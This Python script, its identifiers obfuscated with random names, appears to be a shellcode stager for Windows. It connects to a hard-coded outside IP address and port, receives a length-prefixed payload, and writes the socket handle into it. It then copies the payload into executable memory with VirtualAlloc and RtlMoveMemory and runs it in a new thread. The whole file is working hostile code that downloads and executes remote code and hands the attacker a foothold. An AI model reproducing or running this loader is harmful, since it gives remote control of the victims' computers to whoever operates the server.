import struct, socket, binascii, ctypes, random, time
SjetALtUVZoWD, ThfugrD = None, None
def dKIWgXTe():
	try:
		global ThfugrD
		ThfugrD = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		ThfugrD.connect(('52.221.127.0', 1204))
		bsInwSsc = struct.pack('<i', ThfugrD.fileno())
		l = struct.unpack('<i', str(ThfugrD.recv(4)))[0]
		efKMkUvmotVRe = "     "
		while len(efKMkUvmotVRe) < l: efKMkUvmotVRe += ThfugrD.recv(l)
		iERcvOLY = ctypes.create_string_buffer(efKMkUvmotVRe, len(efKMkUvmotVRe))
		iERcvOLY[0] = binascii.unhexlify('BF')
		for i in xrange(4): iERcvOLY[i+1] = bsInwSsc[i]
		return iERcvOLY
	except: return None
def OBkXKHLJeuyBc(HOqMOYI):
	if HOqMOYI != None:
		nvvRdzeyuCJTLB = bytearray(HOqMOYI)
		fuPYoXHwEQfY = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(nvvRdzeyuCJTLB)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
		ctypes.windll.kernel32.VirtualLock(ctypes.c_int(fuPYoXHwEQfY), ctypes.c_int(len(nvvRdzeyuCJTLB)))
		wMOuPSsxUg = (ctypes.c_char * len(nvvRdzeyuCJTLB)).from_buffer(nvvRdzeyuCJTLB)
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(fuPYoXHwEQfY), wMOuPSsxUg, ctypes.c_int(len(nvvRdzeyuCJTLB)))
		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(fuPYoXHwEQfY),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
SjetALtUVZoWD = dKIWgXTe()
OBkXKHLJeuyBc(SjetALtUVZoWD)
